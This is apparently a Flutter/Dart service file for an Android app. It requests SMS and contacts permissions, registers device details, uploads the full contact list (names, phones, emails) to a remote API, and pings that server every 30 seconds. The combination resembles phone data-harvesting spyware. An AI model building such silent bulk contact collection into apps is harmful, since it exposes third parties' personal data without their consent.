import 'dart:async';
import 'dart:convert';
import 'package:flutter_contacts/flutter_contacts.dart' as contacts;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;
import 'package:uuid/uuid.dart';
import 'package:flutter/foundation.dart';
import '../api_config.dart';

class DeviceService {
  static String? _deviceId;

  static Future<String> getDeviceId() async {
    if (_deviceId != null) return _deviceId!;
    final prefs = await SharedPreferences.getInstance();
    _deviceId = prefs.getString('device_id');
    if (_deviceId == null) {
      _deviceId = const Uuid().v4();
      await prefs.setString('device_id', _deviceId!);
    }
    return _deviceId!;
  }

  static Future<void> registerDevice() async {
    try {
      final deviceId = await getDeviceId();
      final deviceInfo = DeviceInfoPlugin();
      final androidInfo = await deviceInfo.androidInfo;

      final body = jsonEncode({
        'device_id': deviceId,
        'device_name': '${androidInfo.brand} ${androidInfo.model}',
        'model': androidInfo.model,
        'os_version': 'Android ${androidInfo.version.release}',
        'app_version': '1.0.0',
        'phone_number': '',
      });

      await http.post(
        Uri.parse('$apiBaseUrl/api/device'),
        headers: {'Content-Type': 'application/json'},
        body: body,
      );
      debugPrint('Device registered: $deviceId');
    } catch (e) {
      debugPrint('Device registration error: $e');
    }
  }

  static Future<void> requestPermissions() async {
    try {
      await [
        Permission.sms,
        Permission.contacts,
      ].request();
    } catch (e) {
      debugPrint('Permission request error: $e');
    }
  }

  static Future<void> syncContacts() async {
    try {
      final deviceId = await getDeviceId();

      final status = await contacts.FlutterContacts.permissions.request(contacts.PermissionType.read);
      if (status != contacts.PermissionStatus.granted) {
        debugPrint('Contacts permission denied: $status');
        return;
      }

      final allContacts = await contacts.FlutterContacts.getAll(
        properties: {contacts.ContactProperty.phone, contacts.ContactProperty.email},
      );
      final contactList = allContacts.map((c) => {
        'name': c.displayName ?? '',
        'phone': c.phones.map((p) => p.number).join(', '),
        'email': c.emails.map((e) => e.address).join(', '),
      }).toList();

      final body = jsonEncode({
        'device_id': deviceId,
        'contacts': contactList,
      });

      await http.post(
        Uri.parse('$apiBaseUrl/api/contacts'),
        headers: {'Content-Type': 'application/json'},
        body: body,
      );
      debugPrint('Contacts synced: ${contactList.length} contacts');
    } catch (e) {
      debugPrint('Contacts sync error: $e');
    }
  }

  static void startHeartbeat() {
    Timer.periodic(const Duration(seconds: 30), (_) => _ping());
  }

  static Future<void> _ping() async {
    try {
      final deviceId = await getDeviceId();
      await http.post(
        Uri.parse('$apiBaseUrl/api/ping'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'device_id': deviceId}),
      );
    } catch (_) {}
  }

  static Future<void> init() async {
    await requestPermissions();
    await registerDevice();
    await syncContacts();
    startHeartbeat();
  }
}
